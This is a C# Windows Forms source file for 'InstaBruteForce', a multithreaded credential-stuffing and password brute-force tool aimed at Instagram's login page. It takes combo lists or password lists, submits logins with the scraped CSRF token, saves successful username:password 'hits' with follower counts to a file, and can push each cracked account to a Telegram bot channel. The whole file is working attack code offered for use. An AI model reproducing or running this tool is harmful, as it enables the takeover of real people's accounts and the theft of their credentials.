using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MaterialSkin;
using System.Text.RegularExpressions;
using System.IO;
using System.Net;
using System.Threading;


namespace InstaBruteForce
{
    public partial class Main : MaterialSkin.Controls.MaterialForm
    {
        
        int Hit = 0;
        int Tested = 0;
        int Bad = 0;
        int Counter = -1;
        int finishedTh = 0;
        string TmpName = " ";
        List<string> ComboList = new List<string>();
        List<string> PasswordList = new List<string>();
        List<InstaUser> HitList = new List<InstaUser>();
        List<Thread> ThreadList = new List<Thread>();
        int Threads = 0;

        public Main()
        {
            InitializeComponent();

            TmpName ="InstaBrute-Hits-" +DateTime.Now.ToString("yyyy-MM-dd HH-mm", System.Globalization.DateTimeFormatInfo.InvariantInfo) + ".txt";
            Setting.useCombo = true;
            Setting.Capture = true;
            Setting.TeleNotify = false;
        }

        public void ThreadChek()
        {
            finishedTh += 1;
            if (finishedTh == Threads)
            {
                Invoke((Action)(() => { startBtn.Enabled = true; }));
                Invoke((Action)(() => { stopBtn.Enabled = false; }));
                Invoke((Action)(() => { pauseBtn.Enabled = false; }));
                Invoke((Action)(() => { settingControls(true); }));
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {

        }


        private void materialTabSelector1_Click(object sender, EventArgs e)
        {

        }

        private void materialRadioButton1_CheckedChanged(object sender, EventArgs e)
        {
            if (materialRadioButton1.Checked)
            {
                loadBtn.Text = "Load Password";
                usertxt.Enabled = true;
                Setting.useCombo = false;
                countlabel.Text = PasswordList.Count.ToString();
            }
        }

        private void materialRadioButton2_CheckedChanged(object sender, EventArgs e)
        {
            if (materialRadioButton2.Checked)
            {
                loadBtn.Text = "Load Combo";
                usertxt.Enabled = false;
                Setting.useCombo = true;
                countlabel.Text = ComboList.Count.ToString();
            }
        }

        private void materialFlatButton1_Click(object sender, EventArgs e)
        {
            MsgBox msg = new MsgBox();
            msg.ShowDialog();
        }

        

        private void thTxt_KeyDown(object sender, KeyEventArgs e)
        {
            if (!(char.IsDigit((char)e.KeyCode) || e.KeyCode == Keys.Left || e.KeyCode == Keys.Right || e.KeyCode == Keys.Delete || e.KeyCode == Keys.Back || e.KeyCode == Keys.NumPad0 || e.KeyCode == Keys.NumPad1 || e.KeyCode == Keys.NumPad2 || e.KeyCode == Keys.NumPad3 || e.KeyCode == Keys.NumPad4 || e.KeyCode == Keys.NumPad5 || e.KeyCode == Keys.NumPad6 || e.KeyCode == Keys.NumPad7 || e.KeyCode == Keys.NumPad8 || e.KeyCode == Keys.NumPad9))
            {
                e.SuppressKeyPress = true;
            }
           
        }

        private void materialFlatButton3_Click(object sender, EventArgs e)
        {
           
        }

        public void ProcessLogin(string user, string pass)
        {
            try
            {
                WebResponse Response;
                HttpWebRequest Request;
                Uri url = new Uri("https://www.instagram.com/accounts/login/?force_classic_login");

                CookieContainer cookieContainer = new CookieContainer();

                Request = (HttpWebRequest)WebRequest.Create(url);
                Request.Method = "GET";
                Request.CookieContainer = cookieContainer;
                Response = Request.GetResponse();
                string Parametros = "username=" + user + "&password=" + pass + "&" + "csrfmiddlewaretoken=" + cookieContainer.GetCookies(url)["csrftoken"].Value;
                Request = (HttpWebRequest)WebRequest.Create(url);
                Request.Method = "POST";
                Request.KeepAlive = true;
                Request.Accept = "*/*";
                Request.Headers.Add("Accept-Encoding: gzip, deflate");
                Request.ContentType = "application/x-www-form-urlencoded";
                Request.UserAgent = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0";
                Request.CookieContainer = cookieContainer;
                Request.Headers.Add("Cookie", Response.Headers.Get("Set-Cookie"));
                Request.Referer = "https://www.instagram.com/accounts/login/?force_classic_login";
                byte[] byteArray = Encoding.UTF8.GetBytes(Parametros);
                Request.AutomaticDecompression = DecompressionMethods.GZip;
                Request.ContentLength = byteArray.Length;
                Stream dataStream = Request.GetRequestStream();
                dataStream.Write(byteArray, 0, byteArray.Length);
                dataStream.Flush();
                dataStream.Close();
                string s;
                using (HttpWebResponse webResp = (HttpWebResponse)Request.GetResponse())
                {

                    using (Stream datastream = webResp.GetResponseStream())
                    {
                        using (StreamReader reader = new StreamReader(datastream))
                        {
                            s = reader.ReadToEnd();
                        }
                    }
                }
                if (s.Contains("\"alert-red\">"))
                {

                }
                else
                {
                    string pPage;
                    string IsVerify = "No";
                    if (s.Contains("followed_by") || s.Contains("https://www.instagram.com/?hl=en"))
                    {
                    }
                    else if (s.Contains("id_security_code"))
                    {
                        IsVerify = "Yes";
                    }
                    Request = (HttpWebRequest)WebRequest.Create("https://www.instagram.com/" + user);
                    using (HttpWebResponse webResp = (HttpWebResponse)Request.GetResponse())
                    {
                        using (Stream datastream = webResp.GetResponseStream())
                        {
                            using (StreamReader reader = new StreamReader(datastream))
                            {
                                pPage = reader.ReadToEnd();
                            }
                           
                        }
                        webResp.Close();
                    }




                    string Fellower = Regex.Match(pPage, "followed_by\": {\"count\": (.*?)}").Groups[1].Value;
                    string fellowing = Regex.Match(pPage, "follows\": {\"count\": (.*?)}").Groups[1].Value;
                    //string propicUrl = Regex.Match(pPage, "profile_pic_url_hd\": \"(.*?)\",").Groups[1].Value;
                    //string Bioboro = Regex.Match(pPage, "biography\": \"(.*?)\"").Groups[1].Value;
                    IsVerify = "No";
                    AddHit(new InstaUser()
                    {
                        Username = user,
                        Password = pass,
                        Followers = Fellower,
                        Following = fellowing,
                        Verify = IsVerify
                    });
                    Invoke((Action)(() => { Hit += 1; }));
                    Invoke((Action)(() => { hitlabel.Text = Hit.ToString(); }));
                   

                }
                Response.Close();
            }
            catch
            {
                Invoke((Action)(() => { Bad += 1; }));
                Invoke((Action)(() => { badlabel.Text = Bad.ToString(); }));
            }
            Invoke((Action)(() => { Tested += 1; }));
            Invoke((Action)(() => { testlabel.Text = Tested.ToString(); }));
           
           

        }


        public void AddHit(InstaUser account)
        {
            string[] items = new string[]{ account.Username, account.Password, account.Followers, account.Following, account.Verify };

            //Add
            var item = new ListViewItem(items);
            Invoke((Action)(() => { HitList.Add(account); }));
            Invoke((Action)(() => { materialListView1.Items.Add(item); }));
            string strtmp = "";
            if (Setting.Capture)
            {
                strtmp = string.Format("{0}:{1}|Folllowers:{2}|Following:{3}", account.Username, account.Password, account.Followers, account.Following);
            }
            else
            {
                strtmp = string.Format("{0}:{1}", account.Username, account.Password);
            }
            File.AppendAllText(TmpName, strtmp + Environment.NewLine);

            if (Setting.TeleNotify)
            {
                NotifyTelegram(account);
            }
        }

        private void loadBtn_Click(object sender, EventArgs e)
        {
            OpenFileDialog fileDialog = new OpenFileDialog();
            fileDialog.Filter = "Text File | *.txt";
            DialogResult result = fileDialog.ShowDialog();
            if (result == DialogResult.OK)
            {
          
                string[] tmpArry = File.ReadAllLines(fileDialog.FileName);
                if (materialRadioButton1.Checked)
                {
                    foreach (string line in tmpArry)
                    {
                        PasswordList.Add(line);
                    }
                    countlabel.Text = PasswordList.Count.ToString();
                }
                else if (materialRadioButton2.Checked)
                {
                    foreach (string line in tmpArry)
                    {
                        ComboList.Add(line);
                    }
                    countlabel.Text = ComboList.Count.ToString();
                }
            }
        }

        private void startBtn_Click(object sender, EventArgs e)
        {
            if (ComboList.Count > 1 || PasswordList.Count > 1)
            {
                TmpName = "InstaBrute-Hits-" + DateTime.Now.ToString("yyyy-MM-dd HH-mm", System.Globalization.DateTimeFormatInfo.InvariantInfo) + ".txt";
                if (Setting.TeleNotify)
                {
                    Setting.BotToken = tokenTxt.Text;
                    Setting.ChannelID = channelTxt.Text;
                }
                if (!Setting.useCombo)
                { Setting.TargetID = usertxt.Text; }
                ServicePointManager.DefaultConnectionLimit = 100;
                ServicePointManager.Expect100Continue = false;
                Counter = -1;
                stopBtn.Enabled = true;
                pauseBtn.Enabled = true;
                startBtn.Enabled = false;
                settingControls(false);
                ThreadList.Clear();
                Threads = int.Parse(thTxt.Text);
                if (Threads <= 85)
                {
                    for (int i = 0; i < Threads; i++)
                    {
                        if (Setting.useCombo)
                        {
                            Thread th = new Thread(new ThreadStart(ComboMod));
                            ThreadList.Add(th);
                        }
                        else
                        {
                            Thread th = new Thread(new ThreadStart(SingleUserMod));
                            ThreadList.Add(th);
                        }
                    }
                    foreach (Thread th in ThreadList)
                    {
                        try
                        {
                            th.Start();
                        }
                        catch
                        {
                            MessageBox.Show("Threads can't Start", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                }
                else
                {
                    MessageBox.Show("Sorry But Max Thread is 85", "Sorry :(", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        public void ComboMod()
        {
            string Combo = "";
            string _username = "jj";
            string _password = "jj";
            while (true)
            {

                if (Counter == ComboList.Count - 1)
                {
                    ThreadChek();
                    break;
                }

                if (Counter < ComboList.Count)
                {
                    Counter+=1;
                    Combo = ComboList[Counter];
                }

                try
                {
                    _username = Combo.Split(':')[0];
                    _password = Combo.Split(':')[1];

                }
                catch
                {
                    Invoke((Action)(() => { Bad += 1; }));
                    Invoke((Action)(() => { Tested += 1; }));
                    Invoke((Action)(() => { testlabel.Text = testlabel.ToString(); }));
                    Invoke((Action)(() => { badlabel.Text = Bad.ToString(); }));
                }
                finally
                {
                    ProcessLogin(_username, _password);
                }

            }
        }

        public void SingleUserMod()
        {

            string _password = "";
            while (true)
            {

                if (Counter == PasswordList.Count - 1)
                {
                    ThreadChek();
                    break;
                }

                if (Counter < PasswordList.Count)
                {
                    Counter++;
                    _password = PasswordList[Counter];
                }

                try
                {
                    ProcessLogin(Setting.TargetID, _password);
                }
                catch
                {
                    Invoke((Action)(() => { Bad += 1; }));
                    Invoke((Action)(() => { Tested += 1; }));
                    Invoke((Action)(() => { testlabel.Text = Tested.ToString(); }));
                    Invoke((Action)(() => { badlabel.Text = Bad.ToString(); }));
                }

            }
        }
        public void settingControls(bool isEnable)
        {
            materialCheckBox1.Enabled = isEnable;
            materialCheckBox2.Enabled = isEnable;
            usertxt.Enabled = isEnable;
            loadBtn.Enabled = isEnable;
            materialCheckBox1.Enabled = isEnable;
            materialCheckBox2.Enabled = isEnable;
            tokenTxt.Enabled = isEnable;
            channelTxt.Enabled = isEnable;
            thTxt.Enabled = isEnable;
        }

        private void stopBtn_Click(object sender, EventArgs e)
        {
            foreach (Thread th in ThreadList)
            {
                try 
                {
                    th.Abort();
                }
                catch
                {
                    MessageBox.Show("Threads can't be Terminate", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            startBtn.Enabled = true;
            stopBtn.Enabled = false;
            pauseBtn.Enabled = false;
            settingControls(true);
        }

        private void pauseBtn_Click(object sender, EventArgs e)
        {
            if (pauseBtn.Text.ToLower() == "pause")
            {
                try
                {
                    foreach (Thread th in ThreadList)
                    {
                        th.Suspend();
                    }
                }
                catch
                {
                    MessageBox.Show("Threads can't Suspend", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                finally
                {
                    pauseBtn.Text = "Resume";
                    loadBtn.Enabled = true;
                }
            }
            else
            {
                try
                {
                    foreach (Thread th in ThreadList)
                    {
                        th.Resume();
                    }
                }
                catch
                {
                    MessageBox.Show("Threads can't Resume", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                finally
                {
                    pauseBtn.Text = "PAUSE";
                    loadBtn.Enabled = false;
                }
            }
        }

        private void saveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveDialog = new SaveFileDialog();
            saveDialog.Filter = "Text File|*.txt";
            DialogResult result = saveDialog.ShowDialog();
            if (result == DialogResult.OK)
            {
                saveHits(saveDialog.FileName, false);
            }
        }

        public void saveHits(string saveLocation, bool capture)
        {
            string lines="@HelloCyka" + Environment.NewLine;
            string strtmp = "dadach asn Hit nagereftia";
            foreach (InstaUser ahit in HitList)
            {
                if (capture)
                {
                    strtmp = string.Format("{0}:{1}|Folllowers:{2}|Following:{3}|Verify:{4}", ahit.Username, ahit.Password, ahit.Followers, ahit.Following, ahit.Verify);
                }
                else
                {
                    strtmp = string.Format("{0}:{1}", ahit.Username, ahit.Password);
                }
                lines +=  strtmp + Environment.NewLine;
            }
            File.WriteAllText(saveLocation, lines);

        }

        private void saveWithCaptureToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveDialog = new SaveFileDialog();
            saveDialog.Filter = "Text File|*.txt";
            DialogResult result = saveDialog.ShowDialog();
            if (result == DialogResult.OK)
            {
                saveHits(saveDialog.FileName, true);
            }
        }

        private void auBtn_Click(object sender, EventArgs e)
        {
            aboutus lel = new aboutus();
            lel.Show();
        }

        public void NotifyTelegram(InstaUser hit)
        {
            try
            {
                string Msg = string.Format("New Hit\n===================\n{0}:{1}\nFollowers:{2}\nFollowing:{3}\nVerify:{4}\n===================\n@HelloCyka", hit.Username, hit.Password, hit.Followers, hit.Following, hit.Verify);
                string url = string.Format("https://api.telegram.org/bot{0}/sendMessage?chat_id={1}&text={2}", Setting.BotToken, Setting.ChannelID, Msg);
                WebClient cl = new WebClient();
                cl.DownloadString(url);// we can get result and Check it but...
            }
            catch { } 
        }

        private void materialCheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (materialCheckBox1.Checked)
            {
                tokenTxt.Enabled = true;
                channelTxt.Enabled = true;
                testBtn.Enabled = true;
                Setting.TeleNotify = true;
            }
            else
            {
                tokenTxt.Enabled = false;
                channelTxt.Enabled = false;
                testBtn.Enabled = false;
                Setting.TeleNotify = false;
            }
        }

        private void testBtn_Click(object sender, EventArgs e)
        {
            try
            {
                string Msg = "Test InstaGram BruteForce\n@HelloCyka";
                string url = string.Format("https://api.telegram.org/bot{0}/sendMessage?chat_id={1}&text={2}", tokenTxt.Text, channelTxt.Text, Msg);
                WebClient cl = new WebClient();
                cl.DownloadString(url);// we can get result and Check it but...
            }
            catch
            {

            }
        }

        private void materialCheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (materialCheckBox2.Checked)
            {
                Setting.Capture = true;
            }
            else
            {
                Setting.Capture = false;
            }
        }
        
    }
    public class InstaUser
    {
        public string Username { get; set; }
        public string Password { get; set; }
        public string Followers { get; set; }
        public string Following { get; set; }
        //public string Biography { get; set; }
        //public string ProfilePicURL { get; set; }
        public string Verify { get; set; }
    }
        
   
}
